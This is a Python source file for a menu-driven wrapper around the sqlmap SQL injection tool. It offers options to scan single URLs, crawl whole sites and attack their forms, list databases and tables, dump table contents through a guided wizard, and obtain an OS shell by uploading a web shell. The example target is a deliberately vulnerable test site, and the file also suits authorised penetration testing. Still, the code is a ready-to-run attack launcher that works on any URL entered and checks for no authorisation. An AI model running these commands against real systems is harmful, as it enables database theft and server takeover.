import os
import sys
import subprocess
import time
import re
import json

try:
    from msvcrt import getch
except ImportError:
    import termios
    import tty
    def getch():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            return sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class SqlmapTool:
    """
    A class to provide a menu-driven interface for sqlmap.
    """
    def __init__(self, log_func):
        self._log = log_func
        self.active_processes = []

    def _run_command(self, command, shell=False, quiet=False, json_output=False):
        """Executes a shell command, handling errors and logging."""
        self._log("INFO", f"Executing sqlmap command: {' '.join(command)}")
        # When capturing JSON, we should not print the raw output.
        should_print_live = not json_output

        try:
            process = subprocess.Popen(command, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            self.active_processes.append(process)
            
            stdout_full = ""
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    if should_print_live:
                        print(output.strip())
                    stdout_full += output
            
            rc = process.poll()
            if rc != 0:
                self._log("ERROR", f"sqlmap command failed with exit code {rc}. Output: {stdout_full}")

            if json_output:
                try:
                    json_data = [json.loads(line) for line in stdout_full.strip().split('\n') if line]
                    return json_data
                except json.JSONDecodeError:
                    self._log("ERROR", "Failed to parse sqlmap JSON output.")
                    print("Failed to parse JSON output. Raw output:")
                    print(stdout_full)
                    return None # Indicate failure
            else:
                return stdout_full

        except FileNotFoundError:
            print(f"{RED}Error: Command not found: {command[0]}{NC}")
            self._log("ERROR", f"Command not found: {command[0]}")
            return None
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{NC}")
            self._log("ERROR", f"An unexpected error occurred with command {' '.join(command)}: {e}")
            return None
        finally:
            if 'process' in locals() and process in self.active_processes:
                self.active_processes.remove(process)

    def _show_sqlmap_menu(self):
        """Displays the main menu for the sqlmap tool."""
        os.system('clear')
        print(f"{BLUE}---[ SQL Injection Tool (sqlmap) ]---{NC}")
        print(f"  [{GREEN}1{NC}] Scan Single URL")
        print(f"  [{GREEN}2{NC}] Auto-Discover & Scan Site")
        print(f"  [{GREEN}3{NC}] Guided Dump (Wizard)")
        print(f"  [{GREEN}4{NC}] List Databases from a Target URL")
        print(f"  [{GREEN}5{NC}] List Tables from a Database")
        print(f"  [{GREEN}6{NC}] Dump Table Contents")
        print(f"  [{GREEN}7{NC}] Custom Scan")
        print(f"  [{GREEN}8{NC}] Get OS Shell")
        print(f"  [{GREEN}9{NC}] Back to Main Menu")
        print(f"{BLUE}---------------------------------------{NC}")

    def _scan_url(self):
        """Prompts for a URL and runs a basic sqlmap scan."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - SCAN SINGLE URL{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL (e.g., http://testphp.vulnweb.com/artists.php?artist=1): {NC}").strip()
            if not url:
                print(f"{RED}[!] URL cannot be empty.{NC}")
                time.sleep(2)
                return

            print(f"{YELLOW}[*] Starting scan on {url}...{NC}")
            
            command = [
                'sqlmap',
                '-u', url,
                '--batch',
                '--level=1',
                '--risk=1'
            ]
            
            self._run_command(command)
            print(f"\n{GREEN}[✔] Scan complete. Press any key to continue...{NC}")
            input()

        except Exception as e:
            print(f"{RED}[!] An error occurred: {e}{NC}")
            self._log("ERROR", f"Error in _scan_url: {e}")
            time.sleep(3)

    def _crawl_and_scan(self):
        """Prompts for a base URL and crawls it to find and scan links."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - AUTO-DISCOVER & SCAN SITE{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the base URL to crawl (e.g., http://testphp.vulnweb.com): {NC}").strip()
            if not url:
                print(f"{RED}[!] URL cannot be empty.{NC}"); time.sleep(2); return

            depth = input(f"{YELLOW}[?] Enter crawl depth (1-5, default: 2): {NC}").strip()
            if not depth:
                depth = "2"
            if not depth.isdigit() or not 1 <= int(depth) <= 5:
                print(f"{RED}[!] Invalid depth. Using default of 2.{NC}"); depth = "2"; time.sleep(2)

            print(f"\n{YELLOW}[*] Starting crawl and scan on {url} with depth {depth}...{NC}")
            print(f"{YELLOW}[*] This could take a very long time depending on the site size.{NC}")

            command = [
                'sqlmap',
                '-u', url,
                '--crawl', depth,
                '--batch',
                '--forms',
                '--random-agent',
                '--level=3',
                '--risk=2',
                '--answers=follow=Y,sitemap=N,normalize=Y,test=Y,fill=Y,skip=Y,extend=Y,keep=N,threads=1'
            ]
            
            self._run_command(command)
            print(f"\n{GREEN}[✔] Crawl and scan complete. Press any key to continue...{NC}")
            input()

        except Exception as e:
            print(f"{RED}[!] An error occurred: {e}{NC}")
            self._log("ERROR", f"Error in _crawl_and_scan: {e}")
            time.sleep(3)

    def _guided_dump(self):
        """Guides the user step-by-step to dump a database table."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - GUIDED DUMP WIZARD{NC}")
        
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL (e.g., http://testphp.vulnweb.com/artists.php?artist=1): {NC}").strip()
            if not url: print(f"{RED}[!] URL cannot be empty.{NC}"); time.sleep(2); return
        except Exception as e:
            print(f"{RED}[!] Invalid input: {e}{NC}"); return

        print(f"\n{YELLOW}[*] Step 1: Fetching databases from {url}...{NC}")
        dbs_command = ['sqlmap', '-u', url, '--dbs', '--batch', '--exclude-sysdbs', '--flush-session']
        output = self._run_command(dbs_command, json_output=False)
        
        if not output:
            print(f"\n{RED}[!] Failed to fetch databases.{NC}"); input("Press Enter..."); return

        databases = self._parse_databases_from_output(output)
        
        if not databases:
            print(f"{RED}[!] No user databases found.{NC}"); input("Press Enter..."); return

        print(f"\n{GREEN}[✔] Found Databases:{NC}")
        for i, db in enumerate(databases): print(f"  [{i+1}] {db}")
        
        try:
            db_choice = input(f"\n{YELLOW}[?] Select a database to explore [1-{len(databases)}]: {NC}").strip()
            selected_db = databases[int(db_choice) - 1]
        except (ValueError, IndexError):
            print(f"{RED}[!] Invalid selection.{NC}"); time.sleep(2); return

        print(f"You selected: {GREEN}{selected_db}{NC}")

        print(f"\n{YELLOW}[*] Step 2: Fetching tables from database '{selected_db}'...{NC}")
        tables_command = ['sqlmap', '-u', url, '-D', selected_db, '--tables', '--batch']
        output = self._run_command(tables_command, json_output=False)

        if not output:
            print(f"{RED}[!] Failed to fetch tables.{NC}"); input("Press Enter..."); return

        tables = self._parse_tables_from_output(output, selected_db)
        
        if not tables:
            print(f"{RED}[!] No tables found in database '{selected_db}'.{NC}"); input("Press Enter..."); return

        print(f"\n{GREEN}[✔] Found Tables in '{selected_db}':{NC}")
        for i, table in enumerate(tables): print(f"  [{i+1}] {table}")

        try:
            table_choice = input(f"\n{YELLOW}[?] Select a table to dump [1-{len(tables)}]: {NC}").strip()
            selected_table = tables[int(table_choice) - 1]
        except (ValueError, IndexError):
            print(f"{RED}[!] Invalid selection.{NC}"); time.sleep(2); return

        print(f"You selected table: {GREEN}{selected_table}{NC}")

        print(f"\n{YELLOW}[*] Step 3: Dumping data from table '{selected_table}'...{NC}")
        dump_command = ['sqlmap', '-u', url, '-D', selected_db, '-T', selected_table, '--dump', '--batch']
        output = self._run_command(dump_command, json_output=False)

        if not output:
            print(f"\n{RED}[!] Failed to dump data.{NC}"); input("Press Enter..."); return

        print(f"\n{GREEN}[✔] Guided dump finished. Press Enter to continue...{NC}")
        input()

    def _list_dbs(self):
        """Prompts for a URL and lists all databases."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - LIST DATABASES{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL: {NC}").strip()
            if not url: print(f"{RED}[!] URL cannot be empty.{NC}"); time.sleep(2); return
        except Exception as e:
            print(f"{RED}[!] Invalid input: {e}{NC}"); return

        print(f"\n{YELLOW}[*] Fetching databases from {url}... (This may take a moment){NC}")
        dbs_command = ['sqlmap', '-u', url, '--dbs', '--batch', '--exclude-sysdbs', '--flush-session']
        output = self._run_command(dbs_command, json_output=False)
        
        if not output:
            print(f"\n{RED}[!] Failed to fetch databases.{NC}")
            input("Press Enter to continue..."); return

        databases = self._parse_databases_from_output(output)

        if not databases:
            print(f"\n{RED}[!] No user databases found.{NC}")
        else:
            print(f"\n{GREEN}[✔] Found Databases:{NC}")
            for i, db in enumerate(databases):
                print(f"  [{i+1}] {db}")
        
        input("\nPress Enter to continue...")

    def _list_tables(self):
        """Prompts for a URL and database, then lists tables."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - LIST TABLES IN A DATABASE{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL: {NC}").strip()
            if not url: print(f"{RED}[!] URL cannot be empty.{NC}"); time.sleep(2); return
            
            db_name = input(f"{YELLOW}[?] Enter the database name to explore: {NC}").strip()
            if not db_name: print(f"{RED}[!] Database name cannot be empty.{NC}"); time.sleep(2); return
        except Exception as e:
            print(f"{RED}[!] Invalid input: {e}{NC}"); return

        print(f"\n{YELLOW}[*] Fetching tables from database '{db_name}'...{NC}")
        tables_command = ['sqlmap', '-u', url, '-D', db_name, '--tables', '--batch']
        output = self._run_command(tables_command, json_output=False)

        if not output:
            print(f"{RED}[!] Failed to fetch tables.{NC}")
            input("Press Enter to continue..."); return

        tables = self._parse_tables_from_output(output, db_name)
        
        if not tables:
            print(f"{RED}[!] No tables found in database '{db_name}'.{NC}")
        else:
            print(f"\n{GREEN}[✔] Found Tables in '{db_name}':{NC}")
            for i, table in enumerate(tables):
                print(f"  [{i+1}] {table}")

        input("\nPress Enter to continue...")

    def _dump_table(self):
        """Prompts for URL, DB, and table, then dumps the contents."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - DUMP TABLE CONTENTS{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL: {NC}").strip()
            if not url: print(f"{RED}[!] URL cannot be empty.{NC}"); time.sleep(2); return

            db_name = input(f"{YELLOW}[?] Enter the database name: {NC}").strip()
            if not db_name: print(f"{RED}[!] Database name cannot be empty.{NC}"); time.sleep(2); return

            table_name = input(f"{YELLOW}[?] Enter the table name to dump: {NC}").strip()
            if not table_name: print(f"{RED}[!] Table name cannot be empty.{NC}"); time.sleep(2); return
        except Exception as e:
            print(f"{RED}[!] Invalid input: {e}{NC}"); return

        print(f"\n{YELLOW}[*] Dumping data from table '{table_name}' in database '{db_name}'...{NC}")
        dump_command = ['sqlmap', '-u', url, '-D', db_name, '-T', table_name, '--dump', '--batch']
        output = self._run_command(dump_command, json_output=False)

        if not output:
            print(f"\n{RED}[!] Failed to dump data.{NC}")
            input("Press Enter to continue..."); return

        print(f"\n{GREEN}[✔] Dump complete. Press Enter to continue...{NC}")
        input()

    def _get_os_shell(self):
        """Prompts for a URL and attempts to get an OS shell."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - GET OS SHELL{NC}")
        try:
            url = input(f"{YELLOW}[?] Enter the full target URL: {NC}").strip()
            if not url:
                print(f"{RED}[!] URL cannot be empty.{NC}")
                time.sleep(2)
                return
        except Exception as e:
            print(f"{RED}[!] Invalid input: {e}{NC}")
            return

        print(f"\n{YELLOW}[*] Attempting to get an OS shell on {url}...{NC}")
        print(f"{RED}[!] This will automatically try to upload a web shell and may require user interaction if '--batch' is not fully effective.{NC}")
        
        shell_command = ['sqlmap', '-u', url, '--os-shell', '--batch']
        
        self._run_command(shell_command)

        print(f"\n{GREEN}[✔] OS Shell session finished. Press Enter to continue...{NC}")
        input()

    def _parse_databases_from_output(self, output):
        """Extracts database names from sqlmap text output."""
        databases = []
        lines = output.split('\n')
        in_db_section = False
        
        for line in lines:
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            
            if in_db_section and line.strip().startswith('[*]'):
                db_name = line.strip()[3:].strip()  # Remove '[*] ' prefix
                if db_name and not db_name.startswith('[') and len(db_name) < 100:
                    databases.append(db_name)
            
            if in_db_section and ('[INFO]' in line or '[WARNING]' in line or 'fetched data' in line.lower()):
                break
        
        return databases

    def _parse_tables_from_output(self, output, db_name):
        """Extracts table names from sqlmap text output."""
        tables = []
        lines = output.split('\n')
        in_table_section = False
        in_box = False
        
        for i, line in enumerate(lines):
            if f"Database: {db_name}" in line or f"database '{db_name}'" in line.lower():
                in_table_section = True
                continue
            
            if in_table_section and line.strip().startswith('+') and line.strip().endswith('+'):
                in_box = not in_box
                continue
            
            if in_table_section and in_box and line.strip() and not line.strip().startswith('+'):
                if '|' in line:
                    parts = line.split('|')
                    if len(parts) >= 3:
                        table_name = parts[1].strip()
                        if table_name and len(table_name) < 100:
                            tables.append(table_name)
            
            if in_table_section and line.strip().startswith('[*]'):
                table_name = line.strip()[3:].strip()
                if table_name and not table_name.startswith('[') and len(table_name) < 100:
                    tables.append(table_name)
            
            if in_table_section and ('[INFO]' in line or '[WARNING]' in line or 'fetched data' in line.lower()):
                break
        
        return tables

    def _print_dumped_data(self, data, table_name):
        """Formats and prints data dumped from a table in a nice format."""
        if not data:
            print(f"{YELLOW}[!] No data dumped from table '{table_name}'.{NC}")
            return

        columns = list(data[0].keys())
        
        col_widths = {col: len(col) for col in columns}
        for row in data:
            for col in columns:
                col_widths[col] = max(col_widths[col], len(str(row.get(col, ''))))

        header = " | ".join([f"{col:<{col_widths[col]}}" for col in columns])
        print(f"\n{GREEN}Data from table '{table_name}':{NC}")
        print(f"{BLUE}+{'-' * (len(header) + 2)}+{NC}")
        print(f"{BLUE}| {header} |{NC}")
        print(f"{BLUE}+{'-' * (len(header) + 2)}+{NC}")

        for row in data:
            row_str = " | ".join([f"{str(row.get(col, '')):<{col_widths[col]}}" for col in columns])
            print(f"| {row_str} |")

        print(f"{BLUE}+{'-' * (len(header) + 2)}+{NC}")

    def _custom_scan(self):
        """Allows the user to enter custom sqlmap commands."""
        os.system('clear')
        print(f"{YELLOW}[*] SQLMAP - CUSTOM SCAN{NC}")
        print(f"{YELLOW}[!] This option allows you to run any sqlmap command directly.{NC}")
        print(f"{YELLOW}[!] Be careful with the commands you execute.{NC}")
        try:
            custom_command_args = input(f"{YELLOW}[?] Enter custom sqlmap arguments (e.g., -u http://example.com --dbs): {NC}").strip().split()
            if not custom_command_args:
                print(f"{RED}[!] No custom arguments provided.{NC}")
                time.sleep(2)
                return

            command = ['sqlmap'] + custom_command_args
            self._run_command(command)
            print(f"\n{GREEN}[✔] Custom scan complete. Press any key to continue...{NC}")
            input()
        except Exception as e:
            print(f"{RED}[!] An error occurred: {e}{NC}")
            self._log("ERROR", f"Error in _custom_scan: {e}")
            time.sleep(3)

    def run(self):
        """Displays the main sqlmap menu and handles user input."""
        while True:
            self._show_sqlmap_menu()
            print(f"\n{YELLOW}Press a key to select an option [1-9]:{NC} ", end='', flush=True)
            choice = getch()
            if isinstance(choice, bytes): choice = choice.decode('utf-8')
            print(choice)
            
            if choice == '1':
                self._scan_url()
            elif choice == '2':
                self._crawl_and_scan()
            elif choice == '3':
                self._guided_dump()
            elif choice == '4':
                self._list_dbs()
            elif choice == '5':
                self._list_tables()
            elif choice == '6':
                self._dump_table()
            elif choice == '7':
                self._custom_scan()
            elif choice == '8':
                self._get_os_shell()
            elif choice == '9':
                print(f"\n{YELLOW}Returning to main menu...{NC}")
                break
            else:
                print(f"\n{RED}Invalid option. Please try again.{NC}")
                time.sleep(1)
                
    def cleanup(self):
        """Cleans up any running processes."""
        print(f"{YELLOW}[*] Cleaning up sqlmap processes...{NC}")
        for proc in self.active_processes:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self.active_processes = []
        self._log("INFO", "sqlmap cleanup completed.")

if __name__ == '__main__':
    def dummy_log(level, message):
        print(f"LOG [{level}]: {message}")

    sqlmap_tool = SqlmapTool(dummy_log)
    sqlmap_tool.run()
    sqlmap_tool.cleanup()